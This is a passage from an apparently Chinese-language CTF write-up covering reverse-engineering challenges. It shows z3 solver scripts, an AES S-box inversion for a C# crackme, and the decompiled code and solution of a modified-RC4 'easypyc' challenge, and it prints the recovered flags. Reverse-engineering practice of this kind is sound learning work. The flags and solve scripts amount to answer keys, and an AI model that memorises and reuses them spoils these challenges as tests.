key[<span class="number">7</span>] - key[<span class="number">6</span>] * key[<span class="number">3</span>] + key[<span class="number">2</span>] * key[<span class="number">2</span>] - key[<span class="number">4</span>] * <span class="number">32</span> + key[<span class="number">5</span>] * (key[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>) - key[<span class="number">1</span>] * key[<span class="number">1</span>] - <span class="number">6689</span> + <span class="number">41</span></span><br><span class="line">key_cmp[<span class="number">7</span>] = (key[<span class="number">5</span>] - key[<span class="number">3</span>] * <span class="number">41</span> + key[<span class="number">6</span>] * <span class="number">41</span> + key[<span class="number">5</span>] ^ (key[<span class="number">4</span>] &amp; key[<span class="number">6</span>] | key[<span class="number">0</span>]) - (key[<span class="number">7</span>] * <span class="number">24</span> | key[<span class="number">2</span>]) + key[<span class="number">1</span>] - <span class="number">589</span>) - <span class="number">36</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    s.add(key_cmp[i]==<span class="built_in">ord</span>(KEY_cmp[i]))</span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">m=s.model()</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><p>然后异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">key=[<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line">key[<span class="number">6</span>] = <span class="number">54</span></span><br><span class="line">key[<span class="number">1</span>] = <span class="number">38</span></span><br><span class="line">key[<span class="number">3</span>] = <span class="number">99</span></span><br><span class="line">key[<span class="number">0</span>] = <span class="number">83</span></span><br><span class="line">key[<span class="number">7</span>] = <span class="number">46</span></span><br><span class="line">key[<span class="number">2</span>] = <span class="number">121</span></span><br><span class="line">key[<span class="number">5</span>] = <span class="number">45</span></span><br><span class="line">key[<span class="number">4</span>] = <span class="number">64</span></span><br><span class="line">key_cmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">key_cmp += <span class="built_in">chr</span>((key[<span class="number">1</span>] * key[<span class="number">2</span>] - key[<span class="number">5</span>] * <span class="number">72</span> - key[<span class="number">4</span>] * <span class="number">3</span> - key[<span class="number">3</span>] ^ key[<span class="number">1</span>] + (key[<span class="number">3</span>] &lt;&lt; <span class="number">2</span>) + key[<span class="number">2</span>] * <span class="number">6</span> - key[<span class="number">7</span>] &amp; key[<span class="number">6</span>] - <span class="number">1000</span>) - <span class="number">14</span>)</span><br><span class="line">key_cmp += <span class="built_in">chr</span>((key[<span class="number">5</span>] * <span class="number">7</span> + key[<span class="number">3</span>] * <span class="number">3</span> + key[<span class="number">2</span>] + key[<span class="number">6</span>] - (key[<span class="number">2</span>] &gt;&gt; <span class="number">2</span>) - key[<span class="number">1</span>] ^ key[<span class="number">0</span>] + key[<span class="number">7</span>] + (key[<span class="number">4</span>] ^ key[<span class="number">1</span>]) + (key[<span class="number">4</span>] | key[<span class="number">7</span>])) - <span class="number">801</span>)</span><br><span class="line">key_cmp += <span class="built_in">chr</span>((key[<span class="number">6</span>] * <span class="number">5</span> + key[<span class="number">2</span>] * <span class="number">6</span> - key[<span class="number">3</span>] * <span class="number">7</span> + key[<span class="number">4</span>] | key[<span class="number">5</span>] + key[<span class="number">4</span>] * <span class="number">10</span> + key[<span class="number">0</span>] ^ key[<span class="number">1</span>] * <span class="number">3</span> - key[<span class="number">7</span>] + key[<span class="number">0</span>] + key[<span class="number">1</span>]) - <span class="number">924</span>)</span><br><span class="line">key_cmp += <span class="built_in">chr</span>(key[<span class="number">1</span>] * <span class="number">3</span> + key[<span class="number">5</span>] * <span class="number">9</span> + key[<span class="number">0</span>] + key[<span class="number">2</span>] * <span class="number">2</span> + key[<span class="number">3</span>] * <span class="number">5</span> - key[<span class="number">4</span>] * (key[<span class="number">6</span>] ^ key[<span class="number">7</span>]) + <span class="number">321</span> - <span class="number">16</span>)</span><br><span class="line">key_cmp += <span class="built_in">chr</span>((key[<span class="number">5</span>] * <span class="number">12</span> - key[<span class="number">0</span>] ^ key[<span class="number">6</span>] - key[<span class="number">3</span>] * <span class="number">23</span> + key[<span class="number">4</span>] * <span class="number">3</span> + key[<span class="number">2</span>] * <span class="number">8</span> + key[<span class="number">1</span>] - key[<span class="number">7</span>] * <span class="number">2</span> + key[<span class="number">6</span>] * <span class="number">4</span> + <span class="number">1324</span>) + <span class="number">1</span>)</span><br><span class="line">key_cmp += <span class="built_in">chr</span>(key[<span class="number">3</span>] * <span class="number">54</span> - key[<span class="number">1</span>] * <span class="number">3</span> + key[<span class="number">2</span>] * <span class="number">3</span> + key[<span class="number">4</span>] * <span class="number">11</span> - key[<span class="number">5</span>] * <span class="number">2</span> + key[<span class="number">0</span>] + key[<span class="number">7</span>] * <span class="number">3</span> - key[<span class="number">6</span>] - <span class="number">6298</span> + <span class="number">40</span>)</span><br><span class="line">key_cmp += <span class="built_in">chr</span>(key[<span class="number">7</span>] - key[<span class="number">6</span>] * key[<span class="number">3</span>] + key[<span class="number">2</span>] * key[<span class="number">2</span>] - key[<span class="number">4</span>] * <span class="number">32</span> + key[<span class="number">5</span>] * (key[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>) - key[<span class="number">1</span>] * key[<span class="number">1</span>] - <span class="number">6689</span> + <span class="number">41</span>)</span><br><span class="line">key_cmp += <span class="built_in">chr</span>((key[<span class="number">5</span>] - key[<span class="number">3</span>] * <span class="number">41</span> + key[<span class="number">6</span>] * <span class="number">41</span> + key[<span class="number">5</span>] ^ (key[<span class="number">4</span>] &amp; key[<span class="number">6</span>] | key[<span class="number">0</span>]) - (key[<span class="number">7</span>] * <span class="number">24</span> | key[<span class="number">2</span>]) + key[<span class="number">1</span>] - <span class="number">589</span>) - <span class="number">36</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">bytes</span>(key))</span><br><span class="line">flag = [<span class="number">113</span>, <span class="number">74</span>, <span class="number">71</span>, <span class="number">35</span>, <span class="number">29</span>, <span class="number">91</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">114</span>, <span class="number">73</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">69</span>, <span class="number">5</span>, <span class="number">113</span>, <span class="number">35</span>, <span class="number">95</span>, <span class="number">38</span>, <span class="number">20</span>, <span class="number">112</span>, <span class="number">95</span>, <span class="number">7</span>, <span class="number">74</span>, <span class="number">12</span>, <span class="number">102</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">31</span>, <span class="number">87</span>, <span class="number">5</span>, <span class="number">113</span>, <span class="number">98</span>, <span class="number">85</span>, <span class="number">38</span>, <span class="number">16</span>, <span class="number">112</span>, <span class="number">29</span>, <span class="number">6</span>, <span class="number">30</span>, <span class="number">12</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">36</span>, <span class="number">12</span>, <span class="number">23</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">46</span>):</span><br><span class="line">    print(<span class="built_in">chr</span>(flag[i] ^ key[((i + <span class="number">1</span>) % <span class="built_in">len</span>(key))]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#W3$c0m3_T0_th3_py_w0r1d_@nd_z3_1s_s0000_g00d!!</span></span><br></pre></td></tr></table></figure><h2 id="new-language"><a href="#new-language" class="headerlink" title="new_language"></a>new_language</h2><p>考察net逆向，也就是c#语言，使用dnspy就行，甚至还可以调试。</p><p>简单分析后，发现是aes的换盒，也没啥好讲的。实际上就是求box的index。<br><img src="https://i.loli.net/2021/11/11/489OkuU5GHRCewa.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">box=[<span class="number">99</span>,<span class="number">124</span>,<span class="number">119</span>,<span class="number">123</span>,<span class="number">242</span>,<span class="number">107</span>,<span class="number">111</span>,<span class="number">197</span>,<span class="number">48</span>,<span class="number">1</span>,<span class="number">103</span>,<span class="number">43</span>,<span class="number">254</span>,<span class="number">215</span>,<span class="number">171</span>,<span class="number">118</span>,<span class="number">202</span>,<span class="number">130</span>,<span class="number">201</span>,<span class="number">125</span>,<span class="number">250</span>,<span class="number">89</span>,<span class="number">71</span>,<span class="number">240</span>,<span class="number">173</span>,<span class="number">212</span>,<span class="number">162</span>,</span><br><span class="line">     <span class="number">175</span>,<span class="number">156</span>,<span class="number">164</span>,<span class="number">114</span>,<span class="number">192</span>,<span class="number">183</span>,<span class="number">253</span>,<span class="number">147</span>,<span class="number">38</span>,<span class="number">54</span>,<span class="number">63</span>,<span class="number">247</span>,<span class="number">204</span>,<span class="number">52</span>,<span class="number">165</span>,<span class="number">229</span>,<span class="number">241</span>,<span class="number">113</span>,<span class="number">216</span>,<span class="number">49</span>,<span class="number">21</span>,<span class="number">4</span>,<span class="number">199</span>,<span class="number">35</span>,<span class="number">195</span>,<span class="number">24</span>,<span class="number">150</span>,<span class="number">5</span>,</span><br><span class="line">     <span class="number">154</span>,<span class="number">7</span>,<span class="number">18</span>,<span class="number">128</span>,<span class="number">226</span>,<span class="number">235</span>,<span class="number">39</span>,<span class="number">178</span>,<span class="number">117</span>,<span class="number">9</span>,<span class="number">131</span>,<span class="number">44</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">110</span>,<span class="number">90</span>,<span class="number">160</span>,<span class="number">82</span>,<span class="number">59</span>,<span class="number">214</span>,<span class="number">179</span>,<span class="number">41</span>,<span class="number">227</span>,<span class="number">47</span>,<span class="number">132</span>,<span class="number">83</span>,<span class="number">209</span>,<span class="number">0</span>,<span class="number">237</span>,<span class="number">32</span>,</span><br><span class="line">     <span class="number">252</span>,<span class="number">177</span>,<span class="number">91</span>,<span class="number">106</span>,<span class="number">203</span>,<span class="number">190</span>,<span class="number">57</span>,<span class="number">74</span>,<span class="number">76</span>,<span class="number">88</span>,<span class="number">207</span>,<span class="number">208</span>,<span class="number">239</span>,<span class="number">170</span>,<span class="number">251</span>,<span class="number">67</span>,<span class="number">77</span>,<span class="number">51</span>,<span class="number">133</span>,<span class="number">69</span>,<span class="number">249</span>,<span class="number">2</span>,<span class="number">127</span>,<span class="number">80</span>,<span class="number">60</span>,<span class="number">159</span>,<span class="number">168</span>,<span class="number">81</span>,<span class="number">163</span>,</span><br><span class="line">     <span class="number">64</span>,<span class="number">143</span>,<span class="number">146</span>,<span class="number">157</span>,<span class="number">56</span>,<span class="number">245</span>,<span class="number">188</span>,<span class="number">182</span>,<span class="number">218</span>,<span class="number">33</span>,<span class="number">16</span>,<span class="number">255</span>,<span class="number">243</span>,<span class="number">210</span>,<span class="number">205</span>,<span class="number">12</span>,<span class="number">19</span>,<span class="number">236</span>,<span class="number">95</span>,<span class="number">151</span>,<span class="number">68</span>,<span class="number">23</span>,<span class="number">196</span>,<span class="number">167</span>,<span class="number">126</span>,<span class="number">61</span>,<span class="number">100</span>,<span class="number">93</span>,</span><br><span class="line">     <span class="number">25</span>,<span class="number">115</span>,<span class="number">96</span>,<span class="number">129</span>,<span class="number">79</span>,<span class="number">220</span>,<span class="number">34</span>,<span class="number">42</span>,<span class="number">144</span>,<span class="number">136</span>,<span class="number">70</span>,<span class="number">238</span>,<span class="number">184</span>,<span class="number">20</span>,<span class="number">222</span>,<span class="number">94</span>,<span class="number">11</span>,<span class="number">219</span>,<span class="number">224</span>,<span class="number">50</span>,<span class="number">58</span>,<span class="number">10</span>,<span class="number">73</span>,<span class="number">6</span>,<span class="number">36</span>,<span class="number">92</span>,<span class="number">194</span>,<span class="number">211</span>,<span class="number">172</span>,<span class="number">98</span>,</span><br><span class="line">     <span class="number">145</span>,<span class="number">149</span>,<span class="number">228</span>,<span class="number">121</span>,<span class="number">231</span>,<span class="number">200</span>,<span class="number">55</span>,<span class="number">109</span>,<span class="number">141</span>,<span class="number">213</span>,<span class="number">78</span>,<span class="number">169</span>,<span class="number">108</span>,<span class="number">86</span>,<span class="number">244</span>,<span class="number">234</span>,<span class="number">101</span>,<span class="number">122</span>,<span class="number">174</span>,<span class="number">8</span>,<span class="number">186</span>,<span class="number">120</span>,<span class="number">37</span>,<span class="number">46</span>,<span class="number">28</span>,<span class="number">166</span>,<span class="number">180</span>,<span class="number">198</span>,</span><br><span class="line">     <span class="number">232</span>,<span class="number">221</span>,<span class="number">116</span>,<span class="number">31</span>,<span class="number">75</span>,<span class="number">189</span>,<span class="number">139</span>,<span class="number">138</span>,<span class="number">112</span>,<span class="number">62</span>,<span class="number">181</span>,<span class="number">102</span>,<span class="number">72</span>,<span class="number">3</span>,<span class="number">246</span>,<span class="number">14</span>,<span class="number">97</span>,<span class="number">53</span>,<span class="number">87</span>,<span class="number">185</span>,<span class="number">134</span>,<span class="number">193</span>,<span class="number">29</span>,<span class="number">158</span>,<span class="number">225</span>,<span class="number">248</span>,<span class="number">152</span>,<span class="number">17</span>,<span class="number">105</span>,</span><br><span class="line">     <span class="number">217</span>,<span class="number">142</span>,<span class="number">148</span>,<span class="number">155</span>,<span class="number">30</span>,<span class="number">135</span>,<span class="number">233</span>,<span class="number">206</span>,<span class="number">85</span>,<span class="number">40</span>,<span class="number">223</span>,<span class="number">140</span>,<span class="number">161</span>,<span class="number">137</span>,<span class="number">13</span>,<span class="number">191</span>,<span class="number">230</span>,<span class="number">66</span>,<span class="number">104</span>,<span class="number">65</span>,<span class="number">153</span>,<span class="number">45</span>,<span class="number">15</span>,<span class="number">176</span>,<span class="number">84</span>,<span class="number">187</span>,<span class="number">22</span>]</span><br><span class="line"></span><br><span class="line">enc=[<span class="number">64</span>,<span class="number">249</span>,<span class="number">133</span>,<span class="number">69</span>,<span class="number">146</span>,<span class="number">253</span>,<span class="number">253</span>,<span class="number">207</span>,<span class="number">182</span>,<span class="number">4</span>,<span class="number">157</span>,<span class="number">207</span>,<span class="number">251</span>,<span class="number">4</span>,<span class="number">60</span>,<span class="number">81</span>,<span class="number">59</span>,<span class="number">77</span>,<span class="number">146</span>,<span class="number">77</span>,<span class="number">207</span>,<span class="number">26</span>,<span class="number">38</span>,<span class="number">207</span>,<span class="number">64</span>,<span class="number">77</span>,<span class="number">177</span>,<span class="number">77</span>,<span class="number">64</span>,<span class="number">195</span>,<span class="number">77</span>,<span class="number">253</span>,<span class="number">253</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    print(<span class="built_in">chr</span>(box.index(i)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#right!!_y0u_c0mpIete_C#_reVer3e!!</span></span><br></pre></td></tr></table></figure><h2 id="easypyc"><a href="#easypyc" class="headerlink" title="easypyc"></a>easypyc</h2><p>文件名称为，easypyc.exe，应该是py打包的exe，对于这种题型我们需要先用pyinstxtractor.py解包exe，然后将生成文件夹中的pyc文件利用uncompyle6还原为py代码。</p><p>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.6 (tags/v3.8.6:db45529, Sep 23 2020, 15:52:53) [MSC v.1927 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: easypyc.py</span></span><br><span class="line">whatbox = [</span><br><span class="line"> <span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aaaaaaa</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    k = [</span><br><span class="line">     <span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        whatbox[m] = m</span><br><span class="line">        k[m] = <span class="built_in">ord</span>(a[(m % b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            t = (t + whatbox[i] + k[i]) % <span class="number">256</span></span><br><span class="line">            temp = whatbox[i]</span><br><span class="line">            whatbox[i] = whatbox[t]</span><br><span class="line">            whatbox[t] = temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bbbbbbbbbb</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    q = <span class="number">0</span></span><br><span class="line">    w = <span class="number">0</span></span><br><span class="line">    e = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(b):</span><br><span class="line">        q = (q + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        w = (w + whatbox[q]) % <span class="number">256</span></span><br><span class="line">        temp = whatbox[q]</span><br><span class="line">        whatbox[q] = whatbox[w]</span><br><span class="line">        whatbox[w] = temp</span><br><span class="line">        e = (whatbox[q] + whatbox[w]) % <span class="number">256</span></span><br><span class="line">        a[k] = a[k] ^ whatbox[e] ^ <span class="number">102</span></span><br><span class="line">        print(whatbox[e] ^ <span class="number">102</span>,end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ccccccccc</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b):</span><br><span class="line">        a[i] ^= a[((i + <span class="number">1</span>) % b)]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b):</span><br><span class="line">            a[j] ^= a[(j - <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    kkkkkkk = <span class="string">&#x27;Geek2021&#x27;</span></span><br><span class="line">    tttttt = [<span class="number">117</span>, <span class="number">62</span>, <span class="number">240</span>, <span class="number">152</span>, <span class="number">195</span>, <span class="number">117</span>, <span class="number">103</span>, <span class="number">74</span>, <span class="number">240</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">162</span>, <span class="number">17</span>, <span class="number">75</span>, <span class="number">141</span>, <span class="number">165</span>, <span class="number">136</span>, <span class="number">117</span>, <span class="number">113</span>, <span class="number">33</span>, <span class="number">98</span>, <span class="number">151</span>, <span class="number">174</span>, <span class="number">4</span>, <span class="number">48</span>, <span class="number">25</span>, <span class="number">254</span>, <span class="number">101</span>, <span class="number">185</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">87</span>]</span><br><span class="line">    ssss = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag:&#x27;</span>)</span><br><span class="line">    inp = [<span class="number">0</span>] * <span class="built_in">len</span>(ssss)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ssss) != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">&#x27;Length Error!!!!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ssss)):</span><br><span class="line">        inp[i] = <span class="built_in">ord</span>(ssss[i])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        aaaaaaa(kkkkkkk, <span class="built_in">len</span>(kkkkkkk))</span><br><span class="line">        bbbbbbbbbb(inp, <span class="number">32</span>)</span><br><span class="line">        ccccccccc(inp, <span class="number">32</span>)</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">if</span> tttttt[m] != inp[m]:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">&#x27;sorry your flag is wrong&#x27;</span>)</span><br><span class="line">            print(<span class="string">&#x27;success!!!!!!&#x27;</span>)</span><br><span class="line">            print(<span class="string">&#x27;your flag is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ssss))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析下就发现，是个魔改的rc4，然后加了点数组内异或操作，数组异或我就没自己逆了，直接用z3他不香吗。</p><p>先用z3解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enc = [<span class="number">117</span>, <span class="number">62</span>, <span class="number">240</span>, <span class="number">152</span>, <span class="number">195</span>, <span class="number">117</span>, <span class="number">103</span>, <span class="number">74</span>, <span class="number">240</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">162</span>, <span class="number">17</span>, <span class="number">75</span>, <span class="number">141</span>, <span class="number">165</span>, <span class="number">136</span>, <span class="number">117</span>, <span class="number">113</span>, <span class="number">33</span>, <span class="number">98</span>, <span class="number">151</span>, <span class="number">174</span>, <span class="number">4</span>, <span class="number">48</span>, <span class="number">25</span>, <span class="number">254</span>, <span class="number">101</span>, <span class="number">185</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">87</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ccccccccc</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(b):</span><br><span class="line">        a[i] ^= a[((i + <span class="number">1</span>) % b)]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b):</span><br><span class="line">            a[j] ^= a[(j - <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag[%d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">ccccccccc(flag,<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    s.add(flag[i]==enc[i]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">m=s.model()</span><br><span class="line">print(m)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再随便输入合适长度的flag，调试或打印出rc4异或的值，然后异或。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line">flag[<span class="number">8</span>] = <span class="number">104</span></span><br><span class="line">flag[<span class="number">3</span>] = <span class="number">210</span></span><br><span class="line">flag[<span class="number">16</span>] = <span class="number">135</span></span><br><span class="line">flag[<span class="number">15</span>] = <span class="number">175</span></span><br><span class="line">flag[<span class="number">26</span>] = <span class="number">59</span></span><br><span class="line">flag[<span class="number">11</span>] = <span class="number">143</span></span><br><span class="line">flag[<span class="number">18</span>] = <span class="number">87</span></span><br><span class="line">flag[<span class="number">9</span>] = <span class="number">210</span></span><br><span class="line">flag[<span class="number">6</span>] = <span class="number">87</span></span><br><span class="line">flag[<span class="number">24</span>] = <span class="number">38</span></span><br><span class="line">flag[<span class="number">22</span>] = <span class="number">181</span></span><br><span class="line">flag[<span class="number">30</span>] = <span class="number">93</span></span><br><span class="line">flag[<span class="number">14</span>] = <span class="number">105</span></span><br><span class="line">flag[<span class="number">0</span>] = <span class="number">34</span></span><br><span class="line">flag[<span class="number">25</span>] = <span class="number">18</span></span><br><span class="line">flag[<span class="number">28</span>] = <span class="number">71</span></span><br><span class="line">flag[<span class="number">19</span>] = <span class="number">83</span></span><br><span class="line">flag[<span class="number">10</span>] = <span class="number">181</span></span><br><span class="line">flag[<span class="number">20</span>] = <span class="number">3</span></span><br><span class="line">flag[<span class="number">23</span>] = <span class="number">140</span></span><br><span class="line">flag[<span class="number">21</span>] = <span class="number">64</span></span><br><span class="line">flag[<span class="number">7</span>] = <span class="number">69</span></span><br><span class="line">flag[<span class="number">17</span>] = <span class="number">170</span></span><br><span class="line">flag[<span class="number">4</span>] = <span class="number">186</span></span><br><span class="line">flag[<span class="number">29</span>] = <span class="number">155</span></span><br><span class="line">flag[<span class="number">2</span>] = <span class="number">28</span></span><br><span class="line">flag[<span class="number">5</span>] = <span class="number">225</span></span><br><span class="line">flag[<span class="number">12</span>] = <span class="number">128</span></span><br><span class="line">flag[<span class="number">13</span>] = <span class="number">51</span></span><br><span class="line">flag[<span class="number">27</span>] = <span class="number">220</span></span><br><span class="line">flag[<span class="number">31</span>] = <span class="number">161</span></span><br><span class="line">flag[<span class="number">1</span>] = <span class="number">87</span></span><br><span class="line"></span><br><span class="line">xor=[<span class="number">113</span>,<span class="number">14</span>,<span class="number">95</span>,<span class="number">169</span>,<span class="number">240</span>,<span class="number">148</span>,<span class="number">36</span>,<span class="number">49</span>,<span class="number">55</span>,<span class="number">179</span>,<span class="number">234</span>,<span class="number">202</span>,<span class="number">229</span>,<span class="number">86</span>,<span class="number">12</span>,<span class="number">202</span>,<span class="number">226</span>,<span class="number">203</span>,<span class="number">36</span>,<span class="number">42</span>,<span class="number">92</span>,<span class="number">18</span>,<span class="number">214</span>,<span class="number">184</span>,<span class="number">121</span>,<span class="number">96</span>,<span class="number">82</span>,<span class="number">187</span>,<span class="number">47</span>,<span class="number">239</span>,<span class="number">98</span>,<span class="number">220</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    print(<span class="built_in">chr</span>(xor[i]^flag[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span 